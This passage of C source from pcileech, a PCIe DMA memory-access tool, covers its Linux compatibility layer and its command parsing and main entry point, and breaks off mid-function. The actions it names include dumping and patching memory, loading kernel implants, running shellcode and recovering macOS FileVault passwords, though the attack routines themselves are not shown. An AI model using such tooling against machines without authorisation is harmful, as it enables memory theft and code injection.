    pthread_mutexattr_settype(&lpCriticalSection->mta, PTHREAD_MUTEX_RECURSIVE);
    pthread_mutex_init(&lpCriticalSection->mutex, &lpCriticalSection->mta);
}

VOID DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
    pthread_mutex_destroy(&lpCriticalSection->mutex);
    memset(lpCriticalSection, 0, sizeof(CRITICAL_SECTION));
}

VOID EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
    pthread_mutex_lock(&lpCriticalSection->mutex);
}

VOID LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
    pthread_mutex_unlock(&lpCriticalSection->mutex);
}

// ----------------------------------------------------------------------------
// _kbhit functionality below:
// ----------------------------------------------------------------------------

VOID terminal_enable_raw_mode()
{
    struct termios term;
    tcgetattr(0, &term);
    term.c_lflag &= ~(ICANON | ECHO); // Disable echo as well
    tcsetattr(0, TCSANOW, &term);
}

VOID terminal_disable_raw_mode()
{
    struct termios term;
    tcgetattr(0, &term);
    term.c_lflag |= ICANON | ECHO;
    tcsetattr(0, TCSANOW, &term);
}

BOOL _kbhit()
{
    int byteswaiting;
    terminal_enable_raw_mode();
    ioctl(0, FIONREAD, &byteswaiting);
    terminal_disable_raw_mode();
    tcflush(0, TCIFLUSH);
    return byteswaiting > 0;
}



// ----------------------------------------------------------------------------
// SRWLock functionality below:
// ----------------------------------------------------------------------------

static int futex(uint32_t* uaddr, int futex_op, uint32_t val, const struct timespec* timeout, uint32_t* uaddr2, uint32_t val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

VOID InitializeSRWLock(PSRWLOCK SRWLock)
{
    ZeroMemory(SRWLock, sizeof(SRWLOCK));
}

BOOL AcquireSRWLockExclusive_Try(_Inout_ PSRWLOCK SRWLock)
{
    DWORD dwZero = 0;
    __sync_fetch_and_add_4(&SRWLock->c, 1);
    if(atomic_compare_exchange_strong(&SRWLock->xchg, &dwZero, 1)) {
        return TRUE;
    }
    __sync_sub_and_fetch_4(&SRWLock->c, 1);
    return FALSE;
}

VOID AcquireSRWLockExclusive(_Inout_ PSRWLOCK SRWLock)
{
    DWORD dwZero;
    __sync_fetch_and_add_4(&SRWLock->c, 1);
    while(TRUE) {
        dwZero = 0;
        if(atomic_compare_exchange_strong(&SRWLock->xchg, &dwZero, 1)) {
            return;
        }
        futex(&SRWLock->xchg, FUTEX_WAIT, 1, NULL, NULL, 0);
    }
}

_Success_(return)
BOOL AcquireSRWLockExclusive_Timeout(_Inout_ PSRWLOCK SRWLock, _In_ DWORD dwMilliseconds)
{
    DWORD dwZero;
    struct timespec ts;
    __sync_fetch_and_add_4(&SRWLock->c, 1);
    while(TRUE) {
        dwZero = 0;
        if(atomic_compare_exchange_strong(&SRWLock->xchg, &dwZero, 1)) {
            return TRUE;
        }
        if((dwMilliseconds != 0) && (dwMilliseconds != 0xffffffff)) {
            ts.tv_sec = dwMilliseconds / 1000;
            ts.tv_nsec = (dwMilliseconds % 1000) * 1000 * 1000;
            if((-1 == futex(&SRWLock->xchg, FUTEX_WAIT, 1, &ts, NULL, 0)) && (errno != EAGAIN)) {
                __sync_sub_and_fetch_4(&SRWLock->c, 1);
                return FALSE;
            }
        } else {
            if((-1 == futex(&SRWLock->xchg, FUTEX_WAIT, 1, NULL, NULL, 0)) && (errno != EAGAIN)) {
                __sync_sub_and_fetch_4(&SRWLock->c, 1);
                return FALSE;
            }
        }
    }
}

VOID ReleaseSRWLockExclusive(_Inout_ PSRWLOCK SRWLock)
{
    DWORD dwOne = 1;
    if(atomic_compare_exchange_strong(&SRWLock->xchg, &dwOne, 0)) {
        if(__sync_sub_and_fetch_4(&SRWLock->c, 1)) {
            futex(&SRWLock->xchg, FUTEX_WAKE, 1, NULL, NULL, 0);
        }
    }
}

#endif /* LINUX */

```

`pcileech/oscompatibility.h`:

```h
// oscompatibility.h : pcileech windows/linux compatibility layer.
//
// (c) Ulf Frisk, 2017-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __OSCOMPATIBILITY_H__
#define __OSCOMPATIBILITY_H__
#include <leechcore.h>

#ifdef _WIN32

#include <Windows.h>
#include <stdio.h>
#include <winusb.h>
#include <setupapi.h>
#include <bcrypt.h>
#include <conio.h>

#pragma comment (lib, "winusb.lib")
#pragma comment (lib, "setupapi.lib")
#pragma comment (lib, "bcrypt.lib")

typedef unsigned __int64                    QWORD, *PQWORD;
#define PCILEECH_LIBRARY_FILETYPE           ".dll"

#pragma warning( disable : 4477)

VOID usleep(_In_ DWORD us);

#endif /* _WIN32 */
#ifdef LINUX

#include <byteswap.h>
#include <ctype.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <inttypes.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>
#include <sys/eventfd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

typedef void                                VOID, * PVOID, * LPVOID;
typedef void*                               HANDLE, ** PHANDLE, * HMODULE, * FARPROC;
typedef uint32_t                            BOOL, * PBOOL;
typedef uint8_t                             BYTE, * PBYTE, * LPBYTE;
typedef uint8_t                             UCHAR, * PUCHAR;
typedef char                                CHAR, * PCHAR, * PSTR, * LPSTR;
typedef int16_t                             SHORT, * PSHORT;
typedef int32_t                             UINT, LONG;
typedef int64_t                             LONGLONG;
typedef uint16_t                            WORD, * PWORD, USHORT, * PUSHORT;
typedef uint16_t                            WCHAR, * PWCHAR, * LPWSTR, * LPCWSTR;
typedef uint32_t                            DWORD, * PDWORD, * LPDWORD, NTSTATUS, ULONG, * PULONG, ULONG32;
typedef long long unsigned int              QWORD, * PQWORD, ULONG64, * PULONG64, ULONG_PTR;
typedef uint64_t                            DWORD64, * PDWORD64, LARGE_INTEGER, * PLARGE_INTEGER, ULONGLONG, FILETIME, * PFILETIME;
typedef size_t                              SIZE_T, * PSIZE_T;
typedef struct _M128A { ULONGLONG Low; LONGLONG High; } M128A, * PM128A;
typedef void* OVERLAPPED, * LPOVERLAPPED;
typedef struct tdEXCEPTION_RECORD32 { CHAR sz[80]; } EXCEPTION_RECORD32;
typedef struct tdEXCEPTION_RECORD64 { CHAR sz[152]; } EXCEPTION_RECORD64;
typedef struct tdSID { BYTE pb[12]; } SID, * PSID;
typedef DWORD(*PTHREAD_START_ROUTINE)(PVOID);
typedef DWORD(*LPTHREAD_START_ROUTINE)(PVOID);
typedef int(*_CoreCrtNonSecureSearchSortCompareFunction)(void const*, void const*);
#define errno_t                             int
#define CONST                               const
#define TRUE                                1
#define FALSE                               0
#define MAX_PATH                            260
#define LMEM_ZEROINIT                       0x0040
#define INVALID_HANDLE_VALUE                ((HANDLE)-1)
#define STD_INPUT_HANDLE                    ((DWORD)-10)
#define STD_OUTPUT_HANDLE                   ((DWORD)-11)
#define GENERIC_WRITE                       (0x40000000L)
#define GENERIC_READ                        (0x80000000L)
#define FILE_SHARE_READ                     (0x00000001L)
#define CREATE_NEW                          (0x00000001L)
#define OPEN_EXISTING                       (0x00000003L)
#define FILE_ATTRIBUTE_NORMAL               (0x00000080L)
#define STILL_ACTIVE                        (0x00000103L)
#define CRYPT_STRING_HEX_ANY                (0x00000008L)
#define CRYPT_STRING_HEXASCIIADDR           (0x00000008L)
#define STILL_ACTIVE                        (0x00000103L)
#define INVALID_FILE_SIZE                   (0xffffffffL)
#define IMAGE_SCN_MEM_EXECUTE               0x20000000
#define IMAGE_SCN_MEM_WRITE                 0x80000000
#define _TRUNCATE                           ((SIZE_T)-1LL)
#define LPTHREAD_START_ROUTINE              PVOID
#define WINUSB_INTERFACE_HANDLE             libusb_device_handle*
#define PIPE_TRANSFER_TIMEOUT               0x03
#define CONSOLE_SCREEN_BUFFER_INFO          PVOID    // TODO: remove this dummy
#define PCILEECH_LIBRARY_FILETYPE           ".so"
#define SOCKET                              int
#define INVALID_SOCKET	                    -1
#define SOCKET_ERROR	                    -1
#define WSAEWOULDBLOCK                      10035L
#define WAIT_OBJECT_0                       (0x00000000UL)
#define INFINITE                            (0xFFFFFFFFUL)
#define MAXIMUM_WAIT_OBJECTS                64
#define SID_MAX_SUB_AUTHORITIES             (15)
#define SECURITY_MAX_SID_SIZE               (sizeof(SID) - sizeof(DWORD) + (SID_MAX_SUB_AUTHORITIES * sizeof(DWORD)))
#define CP_ACP                              0
#define CP_UTF8                             65001
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16
#define STATUS_SUCCESS                      ((NTSTATUS)0x00000000L)
#define STATUS_ACCESS_DENIED                ((NTSTATUS)0xC0000022L)
#define STATUS_DATA_ERROR                   ((NTSTATUS)0xC000003EL)
#define STATUS_UNSUCCESSFUL                 ((NTSTATUS)0xC0000001L)
#define STATUS_END_OF_FILE                  ((NTSTATUS)0xC0000011L)
#define STATUS_FILE_INVALID                 ((NTSTATUS)0xC0000098L)
#define STATUS_MEMORY_NOT_ALLOCATED         ((NTSTATUS)0xC00000A0L)
#define STATUS_FILE_SYSTEM_LIMITATION       ((NTSTATUS)0xC0000427L)
#define FILE_ATTRIBUTE_DIRECTORY            0x00000010 
#define FILE_ATTRIBUTE_COMPRESSED           0x00000800  
#define FILE_ATTRIBUTE_NOT_CONTENT_INDEXED  0x00002000

//-----------------------------------------------------------------------------
// SAL DEFINES BELOW:
//-----------------------------------------------------------------------------
#define _In_
#define _In_z_
#define _Out_
#define _Inout_
#define _Inout_opt_
#define _In_opt_
#define _In_opt_z_
#define _Out_opt_
#define _Check_return_opt_
#define _Frees_ptr_opt_
#define _Post_ptr_invalid_
#define _Printf_format_string_
#define _In_reads_(x)
#define _In_reads_opt_(x)
#define _Out_writes_(x)
#define __bcount(x)
#define _Inout_bytecount_(x)
#define _Inout_count_(x)
#define _Inout_updates_(x)
#define _Inout_updates_opt_(x)
#define _Inout_updates_bytes_(x)
#define _Out_writes_bytes_opt_(x)
#define _Inout_updates_bytes_opt_(x)
#define _Out_writes_opt_(x)
#define _Out_writes_to_(x,y)
#define _Out_writes_z_(x)
#define _Maybenull_
#define _Success_(x)
#define _When_(x,y)
#define _Writable_bytes_(x)

#define WINAPI
#define UNREFERENCED_PARAMETER(x)           (void)(x)

#define max(a, b)                           (((a) > (b)) ? (a) : (b))
#define min(a, b)                           (((a) < (b)) ? (a) : (b))
#define _byteswap_ushort(v)                 (bswap_16(v))
#define _byteswap_ulong(v)                  (bswap_32(v))
#define _byteswap_uint64(v)                 (bswap_64(v))
#ifndef _rotr
#define _rotr(v,c)                          ((((DWORD)v) >> ((DWORD)c) | (DWORD)((DWORD)v) << (32 - (DWORD)c)))
#endif /* _rotr */
#define _rotr16(v,c)                        ((((WORD)v) >> ((WORD)c) | (WORD)((WORD)v) << (16 - (WORD)c)))
#define _rotr64(v,c)                        ((((QWORD)v) >> ((QWORD)c) | (QWORD)((QWORD)v) << (64 - (QWORD)c)))
#define _rotl64(v,c)                        ((QWORD)(((QWORD)v) << ((QWORD)c)) | (((QWORD)v) >> (64 - (QWORD)c)))
#define _countof(_Array)                    (sizeof(_Array) / sizeof(_Array[0]))
#define sprintf_s(s, maxcount, ...)         (snprintf(s, maxcount, __VA_ARGS__))
#define strnlen_s(s, maxcount)              (strnlen(s, maxcount))
#define strcpy_s(dst, len, src)             (strncpy(dst, src, len))
#define strncpy_s(dst, len, src, srclen)    (strncpy(dst, src, min((QWORD)(max(1, len)) - 1, (QWORD)(srclen))))
#define strncat_s(dst, dstlen, src, srclen) (strncat(dst, src, min((((strlen(dst) + 1 >= (QWORD)(dstlen)) || ((QWORD)(dstlen) == 0)) ? 0 : ((QWORD)(dstlen) - strlen(dst) - 1)), (QWORD)(srclen))))
#define strcat_s(dst, dstlen, src)          (strncat_s(dst, dstlen, src, _TRUNCATE))
#define _vsnprintf_s(dst, len, cnt, fmt, a) (vsnprintf(dst, min((QWORD)(len), (QWORD)(cnt)), fmt, a))
#define _stricmp(s1, s2)                    (strcasecmp(s1, s2))
#define _strnicmp(s1, s2, maxcount)         (strncasecmp(s1, s2, maxcount))
#define strtok_s(s, d, c)                   (strtok_r(s, d, c))
#define _snprintf_s(s,l,c,...)              (snprintf(s,min((QWORD)(l), (QWORD)(c)),__VA_ARGS__))
#define sscanf_s(s, f, ...)                 (sscanf(s, f, __VA_ARGS__))
#define SwitchToThread()                    (sched_yield())
#define ExitThread(dwExitCode)              (pthread_exit(dwExitCode))
#define ExitProcess(c)                      (exit(c ? EXIT_SUCCESS : EXIT_FAILURE))
#define Sleep(dwMilliseconds)               (usleep(1000*dwMilliseconds))
#define fopen_s(ppFile, szFile, szAttr)     ((*ppFile = fopen64(szFile, szAttr)) ? 0 : 1)
#define GetModuleFileNameA(m, f, l)         (readlink("/proc/self/exe", f, l))
#define ZeroMemory(pb, cb)                  (memset(pb, 0, cb))
#define WinUsb_SetPipePolicy(h, p, t, cb, pb)   // TODO: implement this for better USB2 performance.
#define CloseHandle(h)                          // TODO: remove this dummy implementation & replace with WARN.
#define _ftelli64(f)                        (ftello64(f))
#define _fseeki64(f, o, w)                  (fseeko64(f, o, w))
#define _chsize_s(fd, cb)                   (ftruncate64(fd, cb))
#define _fileno(f)                          (fileno(f))
#define InterlockedAdd64(p, v)              (__sync_add_and_fetch(p, v))
#define InterlockedIncrement64(p)           (__sync_add_and_fetch(p, 1))
#define InterlockedIncrement(p)             (__sync_add_and_fetch_4(p, 1))
#define InterlockedDecrement(p)             (__sync_sub_and_fetch_4(p, 1))
#define GetCurrentProcess()					((HANDLE)-1)

typedef struct tdCRITICAL_SECTION {
    pthread_mutex_t mutex;
    pthread_mutexattr_t mta;
} CRITICAL_SECTION, *LPCRITICAL_SECTION;
VOID InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
VOID DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
VOID EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
VOID LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);

typedef struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
} SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME;

typedef struct _WIN32_FIND_DATAA {
    CHAR __cExtension[5];
    CHAR cFileName[MAX_PATH];
} WIN32_FIND_DATAA, *PWIN32_FIND_DATAA, *LPWIN32_FIND_DATAA;

HANDLE FindFirstFileA(LPSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
BOOL FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
HANDLE LocalAlloc(DWORD uFlags, SIZE_T uBytes);
VOID LocalFree(HANDLE hMem);
QWORD GetTickCount64();
BOOL QueryPerformanceFrequency(_Out_ LARGE_INTEGER *lpFrequency);
BOOL QueryPerformanceCounter(_Out_ LARGE_INTEGER *lpPerformanceCount);
VOID GetLocalTime(LPSYSTEMTIME lpSystemTime);
DWORD InterlockedAdd(DWORD *Addend, DWORD Value);

HANDLE CreateThread(
    PVOID    lpThreadAttributes,
    SIZE_T    dwStackSize,
    PVOID    lpStartAddress,
    PVOID    lpParameter,
    DWORD    dwCreationFlags,
    PDWORD    lpThreadId
);

BOOL GetExitCodeThread(
    HANDLE    hThread,
    PDWORD    lpExitCode
);

HMODULE LoadLibraryA(LPSTR lpFileName);
BOOL FreeLibrary(_In_ HMODULE hLibModule);
FARPROC GetProcAddress(HMODULE hModule, LPSTR lpProcName);

BOOL _kbhit();

// SRWLOCK
typedef struct tdSRWLOCK {
    uint32_t xchg;
    int c;
} SRWLOCK, * PSRWLOCK;
VOID InitializeSRWLock(PSRWLOCK SRWLock);
VOID AcquireSRWLockExclusive(_Inout_ PSRWLOCK SRWLock);
VOID ReleaseSRWLockExclusive(_Inout_ PSRWLOCK SRWLock);
#define AcquireSRWLockShared    AcquireSRWLockExclusive
#define ReleaseSRWLockShared    ReleaseSRWLockExclusive

#endif /* LINUX */

#endif /* __OSCOMPATIBILITY_H__ */

```

`pcileech/pcileech.c`:

```c
// pcileech.c : implementation of core pcileech functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "pcileech.h"
#include "device.h"
#include "executor.h"
#include "extra.h"
#include "help.h"
#include "memdump.h"
#include "mempatch.h"
#include "util.h"
#include "kmd.h"
#include "umd.h"
#include "vfs.h"
#include "vmmx.h"

PPCILEECH_CONTEXT ctxMain = NULL;

BOOL PCILeechConfigIntialize(_In_ DWORD argc, _In_ char* argv[])
{
    struct ACTION {
        ACTION_TYPE tp;
        LPSTR sz;
    } ACTION;
    const struct ACTION ACTIONS[] = {
        {.tp = INFO,.sz = "info"},
        {.tp = DUMP,.sz = "dump" },
        {.tp = WRITE,.sz = "write" },
        {.tp = PATCH,.sz = "patch" },
        {.tp = SEARCH,.sz = "search" },
        {.tp = KMDLOAD,.sz = "kmdload" },
        {.tp = KMDEXIT,.sz = "kmdexit" },
        {.tp = MOUNT,.sz = "mount" },
        {.tp = DISPLAY,.sz = "display" },
        {.tp = PAGEDISPLAY,.sz = "pagedisplay" },
        {.tp = TESTMEMREAD,.sz = "testmemread" },
        {.tp = TESTMEMREADWRITE,.sz = "testmemreadwrite" },
        {.tp = MAC_FVRECOVER,.sz = "mac_fvrecover" },
        {.tp = MAC_FVRECOVER2,.sz = "mac_fvrecover2" },
        {.tp = MAC_DISABLE_VTD,.sz = "mac_disablevtd" },
        {.tp = PT_PHYS2VIRT,.sz = "pt_phys2virt" },
        {.tp = PT_VIRT2PHYS,.sz = "pt_virt2phys" },
        {.tp = TLP,.sz = "tlp" },
        {.tp = TLPLOOP,.sz = "tlploop" },
        {.tp = PROBE,.sz = "probe" },
        {.tp = REGCFG,.sz = "regcfg" },
        {.tp = PSLIST,.sz = "pslist" },
        {.tp = PSVIRT2PHYS,.sz = "psvirt2phys" },
        {.tp = AGENT_EXEC_PY,.sz = "agent-execpy" },
        {.tp = AGENT_FORENSIC,.sz = "agent-forensic"},
    };
    DWORD j, i = 1;
    FILE *hFile;
    CHAR szCommandModule[MAX_PATH];
    ctxMain = LocalAlloc(LMEM_ZEROINIT, sizeof(PCILEECH_CONTEXT));
    if(!ctxMain) {
        return 1;
    }
    ctxMain->magic = PCILEECH_CONTEXT_MAGIC;
    ctxMain->version = PCILEECH_CONTEXT_VERSION;
    if(argc < 2) { return FALSE; }
    // set defaults
    ctxMain->argc = argc;
    ctxMain->argv = argv;
    ctxMain->cfg.tpAction = NA;
    ctxMain->cfg.paAddrMax = 0;
    ctxMain->cfg.fOutFile = TRUE;
    ctxMain->cfg.fUserInteract = TRUE;
    // fetch command line actions/options
    loop:
    while(i < argc) {
        // try parse action command
        for(j = 0; j < sizeof(ACTIONS) / sizeof(ACTION); j++) {
            if(0 == _stricmp(argv[i], ACTIONS[j].sz)) {
                ctxMain->cfg.tpAction = ACTIONS[j].tp;
                i++;
                goto loop;
            }
        }
        // try parse external command module name
        if((ctxMain->cfg.tpAction == NA) && (0 != memcmp(argv[i], "-", 1))) {
            Util_GetPathExe(szCommandModule);
            if(strlen(szCommandModule) + strlen(argv[i]) < MAX_PATH - 16) {
                strcat_s(szCommandModule, sizeof(szCommandModule), "leechp_");
                strcat_s(szCommandModule, sizeof(szCommandModule), argv[i]);
                strcat_s(szCommandModule, sizeof(szCommandModule), PCILEECH_LIBRARY_FILETYPE);
                if(0 == fopen_s(&hFile, szCommandModule, "rb")) {
                    memcpy(ctxMain->cfg.szExternalCommandModule, szCommandModule, MAX_PATH);
                    ctxMain->cfg.tpAction = EXTERNAL_COMMAND_MODULE;
                    fclose(hFile);
                    i++;
                    continue;
                }
            }
        }
        // try parse 
        if((ctxMain->cfg.tpAction == NA) && (0 != memcmp(argv[i], "-", 1))) {
            ctxMain->cfg.tpAction = ((strlen(argv[i]) > 3) && !_strnicmp("umd", argv[i], 3)) ? EXEC_UMD : EXEC_KMD;
            strcpy_s(ctxMain->cfg.szShellcodeName, MAX_PATH, argv[i]);
            i++;
            continue;
        }
        // parse options (command not found)
        if(0 == strcmp(argv[i], "-pt")) {
            ctxMain->cfg.fPageTableScan = TRUE;
            i++;
            continue;
        } else if(0 == strcmp(argv[i], "-all")) {
            ctxMain->cfg.fPatchAll = TRUE;
            i++;
            continue;
        } else if(0 == strcmp(argv[i], "-force")) {
            ctxMain->cfg.fForceRW = TRUE;
            i++;
            continue;
        } else if(0 == strcmp(argv[i], "-help")) {
            ctxMain->cfg.fShowHelp = TRUE;
            i++;
            continue;
        } else if(0 == _stricmp(argv[i], "-v")) {
            ctxMain->cfg.fVerbose = TRUE;
            i++;
            continue;
        } else if(0 == _stricmp(argv[i], "-vv")) {
            ctxMain->cfg.fVerboseExtra = TRUE;
            i++;
            continue;
        } else if(0 == _stricmp(argv[i], "-vvv")) {
            ctxMain->cfg.fVerboseExtraTlp = TRUE;
            i++;
            continue;
        } else if(0 == _stricmp(argv[i], "-loop")) {
            ctxMain->cfg.fLoop = TRUE;
            i++;
            continue;
        } else if(0 == strcmp(argv[i], "-nouserinteract")) {
            ctxMain->cfg.fUserInteract = FALSE;
            i++;
            continue;
        } else if(i + 1 >= argc) {
            return FALSE;
        } else if(0 == strcmp(argv[i], "-min")) {
            ctxMain->cfg.paAddrMin = Util_GetNumeric(argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-max")) {
            ctxMain->cfg.paAddrMax = Util_GetNumeric(argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-pid")) {
            ctxMain->cfg.dwPID = (DWORD)Util_GetNumeric(argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-vamin")) {
            ctxMain->cfg.vaAddrMin = Util_GetNumeric(argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-vamax")) {
            ctxMain->cfg.vaAddrMax = Util_GetNumeric(argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-cr3")) {
            ctxMain->cfg.paCR3 = Util_GetNumeric(argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-efibase")) {
            ctxMain->cfg.paEFI_IBI_SYST = Util_GetNumeric(argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-tlpwait")) {
            ctxMain->cfg.dwListenTlpTimeMs = (DWORD)(1000 * Util_GetNumeric(argv[i + 1]));
        } else if((0 == strcmp(argv[i], "-device")) || (0 == strcmp(argv[i], "-z"))) {
            strcpy_s(ctxMain->cfg.szDevice, MAX_PATH, argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-remote")) {
            strcpy_s(ctxMain->cfg.szRemote, MAX_PATH, argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-memmap")) {
            strcpy_s(ctxMain->cfg.szMemMap, MAX_PATH, argv[i + 1]);
        } else if(0 == _stricmp(argv[i], "-memmap-str")) {
            strcpy_s(ctxMain->cfg.szMemMapStr, _countof(ctxMain->cfg.szMemMapStr), argv[i + 1]);
            i += 2;
            continue;
        } else if(0 == strcmp(argv[i], "-out")) {
            if((0 == _stricmp(argv[i + 1], "none")) || (0 == _stricmp(argv[i + 1], "null"))) {
                ctxMain->cfg.fOutFile = FALSE;
            } else {
                strcpy_s(ctxMain->cfg.szFileOut, MAX_PATH, argv[i + 1]);
            }
        } else if(0 == strcmp(argv[i], "-in")) {
            ctxMain->cfg.cbIn = max(0x40000, 0x1000 + Util_GetFileSize(argv[i + 1]));
            ctxMain->cfg.pbIn = LocalAlloc(LMEM_ZEROINIT, (SIZE_T)ctxMain->cfg.cbIn);
            if(!ctxMain->cfg.pbIn) { return FALSE; }
            if(!Util_ParseHexFileBuiltin(argv[i + 1], ctxMain->cfg.pbIn, (DWORD)ctxMain->cfg.cbIn, (PDWORD)&ctxMain->cfg.cbIn)) { return FALSE; }
        } else if(0 == strcmp(argv[i], "-s")) {
            strcpy_s(ctxMain->cfg.szInS, MAX_PATH, argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-mount")) {
            strcpy_s(ctxMain->cfg.szMount, MAX_PATH, argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-sig")) {
            strcpy_s(ctxMain->cfg.szSignatureName, MAX_PATH, argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-hook")) {
            strcpy_s(ctxMain->cfg.szHook, MAX_PATH, argv[i + 1]);
        } else if(0 == strcmp(argv[i], "-kmd")) {
            ctxMain->cfg.paKMD = strtoull(argv[i + 1], NULL, 16);
            if(ctxMain->cfg.paKMD < 0x1000) {
                strcpy_s(ctxMain->cfg.szKMDName, MAX_PATH, argv[i + 1]);
            } else {
                ctxMain->cfg.fAddrKMDSetByArgument = TRUE;
            }
        } else if(2 == strlen(argv[i]) && '0' <= argv[i][1] && '9' >= argv[i][1]) { // -0..9 param
            ctxMain->cfg.qwDataIn[argv[i][1] - '0'] = Util_GetNumeric(argv[i + 1]);
        }
        i += 2;
    }
    if(!ctxMain->cfg.pbIn) {
        ctxMain->cfg.pbIn = LocalAlloc(LMEM_ZEROINIT, 0x40000);
    }
    // set dummy qwAddrMax value (if possible) to disable auto-detect in LeechCore.
    if((ctxMain->cfg.tpAction == TLP) || (ctxMain->cfg.tpAction == DISPLAY) || (ctxMain->cfg.tpAction == PAGEDISPLAY)) {
        ctxMain->cfg.paAddrMax = -1;
    }
    // disable memory auto-detect when memmap is specified
    if(!ctxMain->cfg.paAddrMax && (ctxMain->cfg.szMemMap[0] || ctxMain->cfg.szMemMapStr[0])) {
        ctxMain->cfg.paAddrMax = -1;
    }
    // try correct erroneous options, if needed
    if(ctxMain->cfg.tpAction == NA) {
        return FALSE;
    }
    // set vamax
    if(!ctxMain->cfg.vaAddrMax) {
        ctxMain->cfg.vaAddrMax = (QWORD)-1;
    }
    return TRUE;
}

VOID PCILeechConfigFixup()
{
    QWORD qw;
    // no kmd -> max address == max address that device support
    if(!ctxMain->cfg.szKMDName[0] && !ctxMain->cfg.paKMD) {
        if(ctxMain->cfg.paAddrMax == 0 || ctxMain->cfg.paAddrMax > ctxMain->dev.paMax) {
            ctxMain->cfg.paAddrMax = ctxMain->dev.paMax;
        }
    }
    // fixup addresses
    if(ctxMain->cfg.paAddrMin > ctxMain->cfg.paAddrMax) {
        qw = ctxMain->cfg.paAddrMin;
        ctxMain->cfg.paAddrMin = ctxMain->cfg.paAddrMax;
        ctxMain->cfg.paAddrMax = qw;
    }
    ctxMain->cfg.paCR3 &= ~0xfff;
    ctxMain->cfg.paKMD &= ~0xfff;
}

VOID PCILeechFreeContext()
{
    if(!ctxMain) { return; }
    ActionUnMount();
    KMDClose();
    Vmmx_Close();
    LcClose(ctxMain->hLC);
    LocalFree(ctxMain->cfg.pbIn);
    LocalFree(ctxMain);
    ctxMain = NULL;
}

#ifdef _WIN32
/*
* Call the free context functionality in a separate thread (in case it gets stuck).
* -- pv
*/
VOID WINAPI PCILeechCtrlHandler_TryShutdownThread(PVOID pv)
{
	__try {
		PCILeechFreeContext();
	} __except(EXCEPTION_EXECUTE_HANDLER) { ; }
}

/*
* SetConsoleCtrlHandler for PCILeech - clean up whenever CTRL+C is pressed.
* -- fdwCtrlType
* -- return
*/
BOOL WINAPI PCILeechCtrlHandler(DWORD fdwCtrlType)
{
    if(fdwCtrlType == CTRL_C_EVENT) {
        printf("CTRL+C detected - shutting down ...\n");
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PCILeechCtrlHandler_TryShutdownThread, NULL, 0, NULL);
		Sleep(500);
		TerminateProcess(GetCurrentProcess(), 1);
		Sleep(1000);
		ExitProcess(1);
        return TRUE;
    }
    return FALSE;
}

VOID PCILeechCtrlHandlerInitialize()
{
	SetConsoleCtrlHandler(PCILeechCtrlHandler, TRUE);
}
#endif /* _WIN32 */

#ifdef LINUX
VOID PCILeechCtrlHandlerInitialize()
{
	return;
}
#endif /* LINUX */

int main(_In_ int argc, _In_ char* argv[])
{
    BOOL result;
    HMODULE hExternalCommandModule;
    VOID(*pfnExternalCommandModuleDoAction)(_Inout_ PPCILEECH_CONTEXT pLeechContext);
    PKMDEXEC pKmdExec = NULL;
    result = PCILeechConfigIntialize((DWORD)argc, argv);
    printf("\n");
    if(!result) {
        Help_ShowGeneral();
        PCILeechFreeContext();
        return 1;
    }
    if(ctxMain->cfg.tpAction == EXEC_KMD) {
        result = Util_LoadKmdExecShellcode(ctxMain->cfg.szShellcodeName, &pKmdExec);
        LocalFree(pKmdExec);
        if(!result) {
            Help_ShowGeneral();
            PCILeechFreeContext();
            return 1;
        }
    }
    // actions that do not require a working initialized connection to a pcileech
    // device to start executing the command are found below:
    if(ctxMain->cfg.tpAction == INFO || ctxMain->cfg.tpAction == MAC_FVRECOVER2 || ctxMain->cfg.tpAction == MAC_DISABLE_VTD || ctxMain->cfg.fShowHelp) {
        if(ctxMain->cfg.tpAction == INFO) {
            Help_ShowInfo();
        } else if(ctxMain->cfg.tpAction == MAC_FVRECOVER2) {
            Action_MacFilevaultRecover(FALSE);
        } else if(ctxMain->cfg.tpAction == MAC_DISABLE_VTD) {
            Action_MacDisableVtd();
        } else if(ctxMain->cfg.fShowHelp) {
            Help_ShowDetailed();
        }
        PCILeechFreeContext();
        return 0;
    }
    result = DeviceOpen();
    if(!result) {
        printf("PCILEECH: Failed to connect to the device.\n");
        PCILeechFreeContext();
        return 1;
    }
    PCILeechConfigFixup(); // post device config adjustments
    if(ctxMain->cfg.szKMDName[0] || ctxMain->cfg.paKMD) {
        result = KMDOpen();
        if(!result) {
            printf("PCILEECH: Failed to load kernel module.\n");
            PCILeechFreeContext();
            return 1;
        }
    }
    if(ctxMain->cfg.paAddrMax == 0) {
